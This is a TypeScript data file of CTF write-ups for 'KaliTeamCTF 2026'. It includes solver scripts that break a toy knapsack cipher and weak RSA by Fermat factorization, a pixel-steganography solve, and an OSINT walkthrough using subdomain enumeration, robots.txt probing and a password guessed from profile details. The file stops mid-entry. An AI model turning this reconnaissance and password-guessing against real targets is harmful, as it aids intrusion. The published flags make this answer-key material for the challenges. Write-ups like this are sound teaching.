import type { WriteUp } from "../types";

export const kaliteamctf2026Writeups: WriteUp[] = [
  {
    "id": "kaliteamctf2026-crypto-merkletrapdoor",
    "title": "Writeup CTF - Merkle's Trapdoor",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF - Merkle's Trapdoor",
    "problemDescription": "",
    "tools": [],
    "analysis": "Challenge ini menggunakan skema kriptografi **Merkle-Hellman Knapsack Cryptosystem**. Biasanya, untuk mendekripsi pesan diperlukan *private key* berupa deret **super-increasing**, beserta nilai modulus dan multiplier sebagai trapdoor.\n\nNamun, pada challenge ini hanya diberikan **8 buah public key**:\n\n```text\n{14, 5937, 140, 213, 3, 1403, 901, 2009}\n```\n\nJumlah elemen public key yang hanya **8 buah** menunjukkan bahwa setiap karakter plaintext direpresentasikan sebagai **1 byte (8 bit)**.\n\nPada Merkle-Hellman, setiap blok ciphertext merupakan hasil penjumlahan elemen public key berdasarkan bit plaintext:\n\n```text\nc = b0*k0 + b1*k1 + ... + b7*k7\n```\n\ndengan:\n\n- `bi ∈ {0,1}`\n- `ki` adalah elemen public key.\n\nKarena hanya terdapat **8 bit**, maka seluruh kemungkinan plaintext hanya berjumlah:\n\n```text\n2^8 = 256 kemungkinan\n```\n\nJumlah ini sangat kecil sehingga jauh lebih mudah melakukan **brute force seluruh kombinasi bit** dibanding mencoba merekonstruksi trapdoor atau private key.\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** Merkle's Trapdoor\n- **Kategori:** Crypto\n- **Deskripsi:**\n\n> Behind every great knapsack lies a hidden trapdoor. Can you find your way through the super-increasing shadows?\n\n### Diberikan\n\n**Ciphertext**\n\n```text\n1b99090e0a6109e30414099a090e0a6f211704f4060a20341b99058c060a1c2809d51cbd0a6104e60a6f1cbd21921c281b9921921cbd090320421cbd203f1b990a72\n```\n\n**Public Key**\n\n```text\n{14, 5937, 140, 213, 3, 1403, 901, 2009}\n```\n\n---"
      },
      {
        "title": "Ide Penyelesaian",
        "content": "Strateginya adalah:\n\n1. Pisahkan ciphertext menjadi blok 16-bit (4 digit heksadesimal).\n2. Bangkitkan seluruh kemungkinan byte (`0-255`).\n3. Untuk setiap byte:\n   - Ambil representasi bitnya.\n   - Hitung jumlah knapsack menggunakan public key.\n4. Simpan hasilnya dalam tabel lookup:\n\n```text\nknapsack_sum -> karakter\n```\n\n5. Untuk setiap blok ciphertext:\n   - Cari nilainya pada lookup table.\n   - Konversi kembali menjadi karakter ASCII.\n\nKarena hanya terdapat 256 kemungkinan, seluruh proses berlangsung sangat cepat.\n\n---"
      },
      {
        "title": "Solver",
        "content": "```python\n#!/usr/bin/env python3\n\nct = \"1b99090e0a6109e30414099a090e0a6f211704f4060a20341b99058c060a1c2809d51cbd0a6104e60a6f1cbd21921c281b9921921cbd090320421cbd203f1b990a72\"\n\npub = [14, 5937, 140, 213, 3, 1403, 901, 2009]\n\n# Pisahkan ciphertext menjadi blok 16-bit.\nblocks = [\n    int(ct[i:i+4], 16)\n    for i in range(0, len(ct), 4)\n]\n\nlookup = {}\n\n# Brute force seluruh kemungkinan byte.\nfor b in range(256):\n    bits = [(b >> i) & 1 for i in range(8)]  # LSB-first\n    s = sum(bit * key for bit, key in zip(bits, pub))\n    lookup[s] = b\n\nflag = \"\"\n\nfor c in blocks:\n    flag += chr(lookup[c])\n\nprint(flag)\n```\n\n---"
      },
      {
        "title": "Output",
        "content": "Menjalankan solver menghasilkan:\n\n```text\nKaliTeam{M4rK14_h3lLm3n_Kn3ps3cK}\n```\n\n---"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nct = \"1b99090e0a6109e30414099a090e0a6f211704f4060a20341b99058c060a1c2809d51cbd0a6104e60a6f1cbd21921c281b9921921cbd090320421cbd203f1b990a72\"\r\n\r\npub = [14, 5937, 140, 213, 3, 1403, 901, 2009]\r\n\r\n# ciphertext dibagi per 4 hex char = 16-bit block\r\nblocks = [\r\n    int(ct[i:i+4], 16)\r\n    for i in range(0, len(ct), 4)\r\n]\r\n\r\nlookup = {}\r\n\r\n# coba semua byte 0-255\r\nfor b in range(256):\r\n    bits = [(b >> i) & 1 for i in range(8)]  # LSB-first\r\n\r\n    s = sum(bit * key for bit, key in zip(bits, pub))\r\n\r\n    lookup[s] = b\r\n\r\nflag = \"\"\r\n\r\nfor c in blocks:\r\n    flag += chr(lookup[c])\r\n\r\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{M4rK14_h3lLm3n_Kn3ps3cK}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-crypto-nineseals",
    "title": "Operation NINE SEALS",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Operation NINE SEALS",
    "problemDescription": "",
    "tools": [],
    "analysis": "### Real Vulnerability\n\nThe actual weakness lies in the RSA modulus.\n\nFor RSA:\n\n```\nN = p × q\n```\n\nIf the prime factors are extremely close together, Fermat Factorization becomes trivial.\n\nFermat expresses the modulus as:\n\n```\nN = a² − b²\n```\n\nwhere\n\n```\na = ceil(sqrt(N))\nb² = a² − N\n\np = a − b\nq = a + b\n```\n\nNormally, several iterations are required before `a² − N` becomes a perfect square.\n\nIn this challenge, the very first value already satisfies the condition.\n\nTherefore, the modulus can be factored almost instantly.\n\n---",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "| Field | Value |\n|------|------|\n| Category | Crypto |\n| Challenge | Operation NINE SEALS |\n\n### Description\n\n> Recovered from a dead research host: a stripped binary, a 150MB memory dump, and a public key. Nine seals guard the record — only three are real. Chain them.\n\n---"
      },
      {
        "title": "Given Files",
        "content": "```\narchive.bin\narcomega_ref\nenc_aes_key.bin\nflag.bin\nrsa_pub.txt\nsignal.png\n```\n\nThe challenge provides several files, but only three are required for the real cryptographic solve:\n\n- `rsa_pub.txt`\n- `enc_aes_key.bin`\n- `flag.bin`\n\nThe remaining files (`archive.bin`, `arcomega_ref`, and `signal.png`) mainly serve as hints and decoys.\n\n---"
      },
      {
        "title": "Initial Recon",
        "content": "List the files:\n\n```bash\nls -lh\nfile *\n```\n\nInspect the RSA public key:\n\n```bash\ncat rsa_pub.txt\n```\n\nThe public key contains:\n\n```\nN = 22809372564632431956344838558771942450598371846217962326535730103915001241315815033212323134290346471474056891958291602757667646665833193690583344295372476990143702827655290319448752811980463218963383500530195835501085453862931445627659951234071312304062320618445927999875641704737916544067817158903763694913224000489152705308556768000332719438290112493878473175618631654931478292115338412655576667549199738302510701146129077640293331657834587476070352997821273202433497408470398053271862236983983630959535423878658275969947503465791000316751734773139813847583583413116390028745219630170973961159414781638930191516589\n\ne = 65537\n```\n\nCheck the remaining important files:\n\n```bash\nls -lh enc_aes_key.bin flag.bin rsa_pub.txt\n```\n\nExpected sizes:\n\n```\nenc_aes_key.bin   256 bytes\nflag.bin           83 bytes\nrsa_pub.txt       632 bytes\n```\n\nA 256-byte RSA ciphertext strongly suggests a 2048-bit RSA key.\n\n---"
      },
      {
        "title": "Decoy Path — `signal.png`",
        "content": "The PNG contains metadata hidden inside a `tEXt` chunk.\n\nExtract it with:\n\n```python\nfrom pathlib import Path\n\nraw = Path(\"signal.png\").read_bytes()\n\npos = 8\nwhile pos < len(raw):\n    n = int.from_bytes(raw[pos:pos+4], \"big\")\n    typ = raw[pos+4:pos+8]\n    data = raw[pos+8:pos+8+n]\n\n    if typ == b\"tEXt\":\n        print(data.decode(errors=\"ignore\"))\n\n    pos += 12 + n\n```\n\nThe image also contains a Vigenère-style ciphertext.\n\nUsing the key:\n\n```\nseal\n```\n\nproduces:\n\n```\nTHE NINE SEALS ARE BROKEN.\nTHE FLAG IS\n\nKaliTeam{v1g3n3r3_w4s_nev3r_th3_r34l_ch4ll3ng3}\n\nPRESENT THIS TO THE JUDGES FOR YOUR POINTS.\n```\n\nHowever, this flag is **rejected**.\n\nThe sentence itself hints that the Vigenère puzzle is only a distraction.\n\n---"
      },
      {
        "title": "Recovering the Private Key",
        "content": "Once the factors are known:\n\n```\nφ(N) = (p − 1)(q − 1)\n\nd = e⁻¹ mod φ(N)\n```\n\nThe recovered private key is then used to decrypt the RSA-encrypted AES key via OAEP (SHA-256).\n\nThe resulting AES key decrypts `flag.bin`, which is encrypted using AES-GCM.\n\nThe file layout is:\n\n```\n12 bytes  -> nonce\n16 bytes  -> authentication tag\nremaining -> ciphertext\n```\n\n---"
      },
      {
        "title": "Solver",
        "content": "```python\nfrom pathlib import Path\nimport re\nimport math\n\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP, AES\nfrom Crypto.Hash import SHA256\n\npub = Path(\"rsa_pub.txt\").read_text()\n\nN = int(re.search(r\"N\\s*=\\s*(\\d+)\", pub).group(1))\ne = int(re.search(r\"e\\s*=\\s*(\\d+)\", pub).group(1))\n\n# Fermat factorization\na = math.isqrt(N)\nif a * a < N:\n    a += 1\n\nb2 = a * a - N\nb = math.isqrt(b2)\n\nif b * b != b2:\n    raise SystemExit(\"Fermat factorization failed\")\n\np = a - b\nq = a + b\n\nprint(\"[+] Fermat factorization success\")\n\nphi = (p - 1) * (q - 1)\nd = pow(e, -1, phi)\n\nrsa_key = RSA.construct((N, e, d, p, q))\n\nenc_key = Path(\"enc_aes_key.bin\").read_bytes()\n\naes_key = PKCS1_OAEP.new(\n    rsa_key,\n    hashAlgo=SHA256\n).decrypt(enc_key)\n\nprint(\"[+] AES key:\", aes_key.hex())\n\nflag_data = Path(\"flag.bin\").read_bytes()\n\nnonce = flag_data[:12]\ntag = flag_data[12:28]\nciphertext = flag_data[28:]\n\ncipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)\nflag = cipher.decrypt_and_verify(ciphertext, tag)\n\nprint(\"[+] FLAG:\", flag.decode())\n```\n\n---"
      },
      {
        "title": "Result",
        "content": "Running the solver:\n\n```bash\npython3 solve_final.py\n```\n\nOutput:\n\n```\n[+] Fermat factorization success\n[+] p bits: 1024\n[+] q bits: 1024\n[+] AES key: ...\n[+] FLAG: KaliTeam{l4tt1c3_r3v3rs1ng_4nd_f3rm4t_4ll_4t_0nc3_9001}\n```\n\n---"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nfrom pathlib import Path\r\n\r\nimport sympy as sp\r\nfrom Crypto.Cipher import AES, PKCS1_OAEP\r\nfrom Crypto.Hash import SHA256\r\nfrom Crypto.PublicKey import RSA\r\nfrom Crypto.Util.number import bytes_to_long, inverse, long_to_bytes\r\n\r\n\r\nROOT = Path(__file__).resolve().parent\r\n\r\n\r\ndef read_public_key():\r\n    text = (ROOT / \"rsa_pub.txt\").read_text()\r\n    n = int(re.search(r\"N\\s*=\\s*(\\d+)\", text).group(1))\r\n    e = int(re.search(r\"e\\s*=\\s*(\\d+)\", text).group(1))\r\n    return n, e\r\n\r\n\r\ndef recover_rsa_private_key(n, e):\r\n    factors = sp.factorint(n)\r\n    if len(factors) != 2 or any(exp != 1 for exp in factors.values()):\r\n        raise RuntimeError(f\"unexpected factorization: {factors}\")\r\n\r\n    p, q = map(int, factors.keys())\r\n    phi = (p - 1) * (q - 1)\r\n    d = int(inverse(e, phi))\r\n    return RSA.construct((n, e, d, p, q))\r\n\r\n\r\ndef decrypt_aes_key(rsa_key):\r\n    encrypted = (ROOT / \"enc_aes_key.bin\").read_bytes()\r\n\r\n    # The RSA ciphertext is OAEP padded with SHA-256.\r\n    return PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256).decrypt(encrypted)\r\n\r\n\r\ndef decrypt_flag(aes_key):\r\n    blob = (ROOT / \"flag.bin\").read_bytes()\r\n\r\n    # Layout: nonce(12) || tag(16) || ciphertext.\r\n    nonce = blob[:12]\r\n    tag = blob[12:28]\r\n    ciphertext = blob[28:]\r\n\r\n    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)\r\n    return cipher.decrypt_and_verify(ciphertext, tag)\r\n\r\n\r\ndef main():\r\n    n, e = read_public_key()\r\n    rsa_key = recover_rsa_private_key(n, e)\r\n    aes_key = decrypt_aes_key(rsa_key)\r\n    flag = decrypt_flag(aes_key)\r\n    print(flag.decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{l4tt1c3_r3v3rs1ng_4nd_f3rm4t_4ll_4t_0nc3_9001}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-misc-callme1",
    "title": "Call Me 1 - Writeup",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Call Me 1 - Writeup",
    "problemDescription": "Challenge ini menggunakan beberapa lapisan analisis. Empat file JPEG awal merupakan **autostereogram** yang mengarahkan peserta ke situs **PixelDream**. Endpoint challenge kemudian menyediakan **1.000 frame PNG** berukuran **64×64**.\n\nMayoritas frame dibuat secara deterministik berdasarkan nomor frame, namun terdapat **25 frame** yang sengaja dimodifikasi dengan mengubah **satu piksel**. Dengan merekonstruksi frame asli dan membandingkannya dengan frame yang diberikan server, nilai piksel yang berubah dapat dibaca sebagai karakter ASCII.\n\nHasil decoding menghasilkan URL:\n\n```\np1xeldream.xyz/catman2026\n```\n\nHalaman tersebut berisi profil **Catman** beserta tautan:\n\n```\n/download/flag\n```\n\nTautan tersebut menghasilkan arsip ZIP AES yang berhasil dibuka menggunakan password:\n\n```\nsucram_8543\n```\n\nSehingga diperoleh flag:\n\n```\nKaliTeam{h1_catman!}\n```\n\n---",
    "tools": [],
    "analysis": "Seluruh dataset PNG tampak seperti **noise RGB acak**.\n\nKarakteristik:\n\n- ukuran 64×64\n- nama file berupa ID numerik\n- tidak terdapat metadata menarik\n- tidak ada string yang dapat diekstrak\n- bit-plane analysis tidak menghasilkan informasi berguna\n- histogram antar gambar terlihat acak\n\nAwalnya terlihat seperti noise biasa sehingga berbagai teknik steganografi standar menghasilkan banyak *false positive*.\n\n---\n\n### Rekonstruksi Generator Frame\n\nSetelah dilakukan reverse engineering terhadap pola frame, diketahui bahwa seluruh gambar dibuat menggunakan generator berikut.\n\nUntuk frame bernomor `n`:\n\n```python\nrng = random.Random(n)\n\nR = rng.randrange(256)\nG = rng.randrange(256)\nB = rng.randrange(256)\n\nR = (R + 2*x) % 256\nG = (G + 2*y) % 256\nB = (B + (n & 0xff)) % 256\n```\n\nKarena seed hanya menggunakan **nomor frame**, maka setiap frame asli dapat direkonstruksi secara identik.\n\n---\n\n### 1. Rekonstruksi Frame\n\nUntuk setiap frame:\n\n```\n0\n...\n999\n```\n\nsolver membuat ulang gambar menggunakan seed yang sama.\n\n---",
    "solution": [
      {
        "title": "File Challenge",
        "content": "Artefak yang digunakan selama penyelesaian:\n\n```\ncall_me.zip\n├── call me (1).jpg\n├── call me (2).jpg\n├── call me (3).jpg\n└── call me (4).jpg\n\nframes.zip\natau\nframes/\n├── 0000.png\n├── 0001.png\n...\n└── 0999.png\n\nflag.zip\nsolve.py\n```\n\n---"
      },
      {
        "title": "Perbandingan Frame",
        "content": "Frame hasil rekonstruksi kemudian dibandingkan dengan dataset asli.\n\nHasilnya ditemukan tepat **25 frame** yang berbeda.\n\nNomor frame tersebut adalah:\n\n```\n0038\n0076\n0114\n0152\n0190\n0228\n0266\n0304\n0342\n0380\n0418\n0456\n0494\n0532\n0570\n0608\n0646\n0684\n0722\n0760\n0798\n0836\n0874\n0912\n0950\n```\n\nSeluruh frame tersebut memiliki pola yang sama.\n\nHanya terdapat **satu piksel berbeda**, yaitu:\n\n```\n(x, y) = (2,2)\n```\n\nKetiga kanal RGB memiliki nilai yang sama.\n\nMisalnya:\n\n```\n(112,112,112)\n```\n\nSehingga cukup dibaca sebagai satu byte ASCII.\n\n---"
      },
      {
        "title": "Decode ASCII",
        "content": "Nilai byte yang diperoleh:\n\n```\n112\n49\n120\n101\n108\n100\n114\n101\n97\n109\n46\n120\n121\n122\n47\n99\n97\n116\n109\n97\n110\n50\n48\n50\n54\n```\n\nJika dikonversi ke ASCII menjadi:\n\n```\np1xeldream.xyz/catman2026\n```\n\n---"
      },
      {
        "title": "Halaman Profil",
        "content": "URL tersebut menampilkan profil:\n\n```\nName:\nMarcus\n\nSurname:\nWhiskerton\n\nNickname:\nCatman\n\nBirthdate:\n14/03/1985\n\nChild's name:\nLuna\n\nChild's nickname:\nLulu\n\nChild's birthdate:\n22/07/2016\n\nPet's name:\nbat\n\nCompany name:\nJordansec\n```\n\nDi bagian bawah halaman terdapat tautan:\n\n```\n/download/flag\n```\n\n---"
      },
      {
        "title": "Arsip ZIP",
        "content": "File yang diunduh merupakan ZIP AES.\n\nMetode kompresinya:\n\n```\nCompression Method = 99\n```\n\nKarena menggunakan AES ZIP, utilitas unzip bawaan akan menampilkan error:\n\n```\nunsupported compression method 99\n```\n\nSedangkan **7-Zip** dapat membukanya.\n\n---"
      },
      {
        "title": "Password",
        "content": "Password yang berhasil diverifikasi:\n\n```\nsucram_8543\n```\n\nBagian:\n\n```\nsucram\n```\n\nmerupakan nama:\n\n```\nMarcus\n```\n\nyang dibalik.\n\nSuffix:\n\n```\n8543\n```\n\ntidak dapat diturunkan secara pasti hanya dari informasi profil, sehingga writeup ini tidak mengklaim rumus tertentu.\n\nKeberhasilan password dibuktikan melalui proses dekripsi yang menghasilkan file `flag.txt`.\n\n---"
      },
      {
        "title": "2. Bandingkan",
        "content": "Bandingkan:\n\n```\nframe_server\n```\n\nvs\n\n```\nframe_reconstructed\n```\n\nFrame normal:\n\n```\ntidak ada perbedaan\n```\n\nFrame pembawa data:\n\n```\n1 piksel berbeda\n```\n\n---"
      },
      {
        "title": "3. Ambil Byte",
        "content": "Byte diambil dari:\n\n```\npixel (2,2)\n```\n\nLalu diurutkan berdasarkan ID frame.\n\nHasil:\n\n```\np1xeldream.xyz/catman2026\n```\n\n---"
      },
      {
        "title": "4. Download Arsip",
        "content": "Solver membuka URL:\n\n```\nhttps://p1xeldream.xyz/catman2026\n```\n\nKemudian mengambil tautan eksplisit:\n\n```\n/download/flag\n```\n\nTanpa melakukan scanning host maupun enumerasi path.\n\n---"
      },
      {
        "title": "5. Dekripsi ZIP",
        "content": "Prioritas metode:\n\n1. `pyzipper`\n2. `7z`\n3. `7zz`\n4. `7za`\n\nPassword:\n\n```\nsucram_8543\n```\n\n---"
      },
      {
        "title": "6. Validasi Flag",
        "content": "Isi hasil dekripsi divalidasi menggunakan regex:\n\n```regex\nKaliTeam\\{[^}\\r\\n]+\\}\n```\n\nFlag hanya dicetak apabila pola tersebut cocok.\n\n---"
      },
      {
        "title": "Solve Script",
        "content": "`solve.py` mendukung dua jenis input:\n\n```\nframes.zip\n```\n\natau\n\n```\nframes/\n```\n\nAlur kerja:\n\n1. Membaca dataset frame\n2. Merekonstruksi frame asli\n3. Membandingkan seluruh frame\n4. Mengambil piksel yang berubah\n5. Memulihkan URL profil\n6. Mengunduh `flag.zip`\n7. Mendekripsi ZIP\n8. Memvalidasi isi `flag.txt`\n9. Menampilkan flag\n\n---"
      },
      {
        "title": "Dependency",
        "content": "Analisis frame:\n\n```bash\npython3 -m pip install numpy pillow\n```\n\nAlternatif dekripsi ZIP AES:\n\n```bash\npython3 -m pip install pyzipper\n```\n\nAtau cukup menggunakan **7-Zip**.\n\n---"
      },
      {
        "title": "Cara Menjalankan",
        "content": "Jika menggunakan `frames.zip`:\n\n```bash\npython3 solve.py --frames frames.zip --archive flag.zip\n```\n\nJika dataset sudah diekstrak:\n\n```bash\npython3 solve.py --frames frames --archive flag.zip\n```\n\nJika `flag.zip` belum tersedia:\n\n```bash\npython3 solve.py --frames frames.zip\n```\n\nUntuk hanya memverifikasi tahap pertama:\n\n```bash\npython3 solve.py --frames frames.zip --stage1-only\n```\n\nEkstraksi manual menggunakan 7-Zip:\n\n```bash\n7z x -aoa -psucram_8543 flag.zip\ncat flag.txt\n```\n\n---"
      },
      {
        "title": "Output",
        "content": "```text\n[+] Recovered profile: p1xeldream.xyz/catman2026\n[+] Profile URL: https://p1xeldream.xyz/catman2026\n[*] Decrypting 'flag.txt' using password 'sucram_8543'\n<FLAG>KaliTeam{h1_catman!}</FLAG>\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{h1_catman!}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-misc-oshit",
    "title": "OSINT CTF Write-up — OSHIT",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Saya telah menyusun write-up tersebut dalam format yang rapi untuk `README.md` menggunakan gaya dokumentasi GitHub.",
    "problemDescription": "Challenge memberikan satu artefak awal berupa sebuah **invoice** milik **Asterion Field Services W.L.L.**. Dari dokumen tersebut diperoleh beberapa informasi penting sebagai titik awal investigasi.\n\n| Field               | Value                                                                     |\n| ------------------- | ------------------------------------------------------------------------- |\n| Company             | Asterion Field Services W.L.L.                                            |\n| Domain              | `asterion.kali-team.online`                                               |\n| Email               | `info@asterion.kali-team.online`                                          |\n| Project Reference   | `NQ-441`                                                                  |\n| Project Description | Supply, Delivery & Commissioning of Field Support & Maintenance Equipment |\n\nFormat flag yang diberikan adalah:\n\n```text\nKaliTeam{CONTACT_REGISTRATION_PORTAL_WAREHOUSE_AREA}\n```\n\nFlag akhir:\n\n```text\nKaliTeam{MAZEN_DARWISH_104728_OPS_C12_SAHAB}\n```\n\n---",
    "tools": [],
    "analysis": "Invoice menjadi satu-satunya titik awal investigasi.\n\nPivot utama yang diperoleh:\n\n* Company : **Asterion Field Services W.L.L.**\n* Domain : **asterion.kali-team.online**\n* Project : **NQ-441**\n\nPemeriksaan awal dilakukan menggunakan `curl`.\n\n```bash\ncurl https://asterion.kali-team.online/\n```\n\nHalaman utama dilindungi oleh **Cloudflare Managed Challenge** sehingga hanya menampilkan halaman:\n\n```text\nJust a moment...\nEnable JavaScript and cookies to continue\n```\n\nKarena challenge bertipe **OSINT**, tidak diperlukan usaha untuk melewati Cloudflare. Fokus dialihkan ke pencarian jejak publik lain yang masih berhubungan dengan domain tersebut.\n\n---\n\n### 3. Enumerasi Subdomain\n\nEnumerasi dilakukan menggunakan **Subfinder**.\n\n```bash\nsubfinder -silent -all -recursive \\\n  -d kali-team.online\n```\n\nHasil yang relevan:\n\n```text\nasterion.kali-team.online\nmedia.asterion.kali-team.online\nops.asterion.kali-team.online\ntenders.asterion.kali-team.online\n```\n\nBerbeda dengan domain utama, ketiga subdomain dapat diakses langsung.\n\n```text\nmedia.asterion.kali-team.online\nTitle: Asterion Project Media\n\nops.asterion.kali-team.online\nTitle: Asterion Operations Portal\n\ntenders.asterion.kali-team.online\nTitle: Infrastructure Procurement Archive\n```\n\nKarena domain `kali-team.online` merupakan domain penyelenggara challenge, ruang lingkup investigasi dibatasi hanya pada:\n\n```text\n*.asterion.kali-team.online\n```\n\n---\n\n### 11. Menentukan Industrial Area\n\nPada gambar kedua terlihat papan bertuliskan:\n\n```text\nSAHAB INDUSTRIAL ESTATE\n```\n\nAwalnya beberapa kandidat dicoba:\n\n```text\nSAHAB_INDUSTRIAL_ESTATE\nSAHAB_INDUSTRIAL_AREA\nSAHAB_INDUSTRIAL_CITY\n```\n\nSeluruhnya salah.\n\nChallenge meminta:\n\n> The industrial area associated with the final delivery\n\nYang dimaksud hanyalah nama kawasannya:\n\n```text\nSAHAB\n```\n\nSehingga:\n\n```text\nAREA = SAHAB\n```\n\n### Rabbit Hole Terbesar\n\nTulisan pada papan sangat jelas sehingga mudah mengira seluruh frasa harus dimasukkan ke flag.\n\nPadahal:\n\n* **SAHAB** → nama area\n* **Industrial Estate** → jenis kawasan\n\n---",
    "solution": [
      {
        "title": "2. Rabbit Hole Pertama — Passive Reconnaissance",
        "content": "Beberapa sumber OSINT pasif diperiksa:\n\n* Certificate Transparency (`crt.sh`)\n* Wayback Machine\n* URLScan\n* DNS Records\n\nCertificate Transparency:\n\n```bash\ncurl -s \"https://crt.sh/?q=%25.asterion.kali-team.online&output=json\"\n```\n\nWayback Machine:\n\n```bash\ncurl -sG \"https://web.archive.org/cdx/search/cdx\" \\\n  --data-urlencode \"url=asterion.kali-team.online/*\" \\\n  --data-urlencode \"output=json\"\n```\n\nSemua hasil kosong.\n\nAwalnya diasumsikan arsip lama perusahaan tersedia, namun ternyata infrastruktur challenge relatif baru sehingga belum memiliki rekaman publik.\n\n**Pelajaran:** hasil kosong pada passive reconnaissance tidak berarti target tidak memiliki subdomain aktif.\n\n---"
      },
      {
        "title": "4. Memetakan Fungsi Setiap Subdomain",
        "content": "| Subdomain                         | Fungsi                          |\n| --------------------------------- | ------------------------------- |\n| media.asterion.kali-team.online   | Arsip foto proyek               |\n| ops.asterion.kali-team.online     | Portal operasi internal         |\n| tenders.asterion.kali-team.online | Arsip tender dan dokumen vendor |\n\nStruktur tersebut menunjukkan bahwa setiap komponen flag kemungkinan tersebar pada layanan yang berbeda.\n\n---"
      },
      {
        "title": "5. Menemukan Portal Identifier",
        "content": "Halaman operasi diperiksa.\n\n```bash\ncurl -skL https://ops.asterion.kali-team.online/\n```\n\nPotongan HTML:\n\n```html\n<form id=\"login\">\n...\n</form>\n\n<div class=\"node\">PORTAL CODE: OPS</div>\n```\n\nJavaScript halaman:\n\n```javascript\ndocument.getElementById('login').addEventListener(\n  'submit',\n  e => {\n    e.preventDefault();\n    document.getElementById('alert').style.display = 'block';\n  }\n);\n```\n\nPortal secara eksplisit menampilkan:\n\n```text\nPORTAL CODE: OPS\n```\n\nSehingga diperoleh:\n\n```text\nPORTAL = OPS\n```\n\n### Rabbit Hole — Login Injection\n\nKarena tampilannya menyerupai halaman login, sempat muncul dugaan bahwa challenge memerlukan:\n\n* SQL Injection\n* Credential Guessing\n* Authentication Bypass\n* Hidden API\n\nNamun setelah source diperiksa, form hanya menjalankan:\n\n```javascript\npreventDefault()\n```\n\nTidak ada request yang dikirim ke backend.\n\nKesimpulannya:\n\n* Tidak diperlukan SQL Injection.\n* Tidak diperlukan brute force.\n* Tidak ada backend autentikasi.\n\n---"
      },
      {
        "title": "6. Menemukan Jalur Dokumen Melalui robots.txt",
        "content": "Pemeriksaan dilakukan pada server tender.\n\n```bash\ncurl -skL https://tenders.asterion.kali-team.online/robots.txt\n```\n\nHasil:\n\n```text\nUser-agent: *\nDisallow: /vendor-docs/\nDisallow: /archive/\n```\n\nDua direktori tersembunyi berhasil ditemukan:\n\n```text\n/archive/\n/vendor-docs/\n```\n\n---"
      },
      {
        "title": "7. Mendapatkan Authorized Project Contact",
        "content": "Isi direktori `/archive/`:\n\n```text\naward_notice_NQ418.pdf\naward_notice_NQ427.pdf\naward_notice_NQ441.pdf\naward_notice_NQ452.pdf\n```\n\nKarena proyek yang dicari adalah **NQ-441**, dokumen yang digunakan:\n\n```text\naward_notice_NQ441.pdf\n```\n\nDiunduh menggunakan:\n\n```bash\ncurl -fsSL \\\nhttps://tenders.asterion.kali-team.online/archive/award_notice_NQ441.pdf \\\n-o award_notice_NQ441.pdf\n```\n\nEkstraksi PDF:\n\n```bash\npdftotext -layout award_notice_NQ441.pdf -\n```\n\nDokumen menyebutkan:\n\n```text\nAuthorized Project Contact\nMazen Darwish\n```\n\nSesuai format flag:\n\n```text\nCONTACT = MAZEN_DARWISH\n```\n\n---"
      },
      {
        "title": "8. Mendapatkan Company Registration Number",
        "content": "Direktori `/vendor-docs/` berisi:\n\n```text\nvendor_requirements.pdf\nsafety_compliance_2025.pdf\nsupplier_prequalification_2025.pdf\npayment_terms.pdf\n```\n\nDokumen yang relevan:\n\n```text\nsupplier_prequalification_2025.pdf\n```\n\nEkstraksi:\n\n```bash\npdftotext -layout supplier_prequalification_2025.pdf -\n```\n\nIsi tabel:\n\n| Vendor                  | Vendor ID | Registration No. | Status               |\n| ----------------------- | --------- | ---------------- | -------------------- |\n| Asterion Field Services | V-204     | 104728           | Temporarily Approved |\n\nDidapat dua angka berbeda:\n\n```text\nVendor ID       : V-204\nRegistration No.: 104728\n```\n\nKarena challenge meminta **company registration number**, maka yang digunakan adalah:\n\n```text\nREGISTRATION = 104728\n```\n\n### Rabbit Hole — V-204\n\nAwalnya nilai `V-204` sempat dianggap sebagai registration number.\n\nNamun struktur tabel memperjelas:\n\n* `V-204` → Vendor ID\n* `104728` → Registration Number\n\n---"
      },
      {
        "title": "9. Membuka Arsip Media Proyek",
        "content": "Halaman media menampilkan daftar proyek:\n\n```text\nNQ-418\nNQ-427\nNQ-441\nNQ-452\n```\n\nDirektori proyek:\n\n```text\n/projects/nq-441/\n```\n\nSource halaman menunjukkan dua gambar:\n\n```text\n/assets/nq441_a.jpg\n/assets/nq441_b.jpg\n```\n\nCaption:\n\n```text\nDelivery image 01\nLoading-bay approach and receiving area.\n\nDelivery image 02\nFinal handover at the assigned warehouse.\n```\n\n---"
      },
      {
        "title": "Gambar Pertama",
        "content": "Kode gudang hanya terlihat:\n\n```text\nC-1_\n```\n\nTidak cukup jelas untuk digunakan.\n\n---"
      },
      {
        "title": "Gambar Kedua",
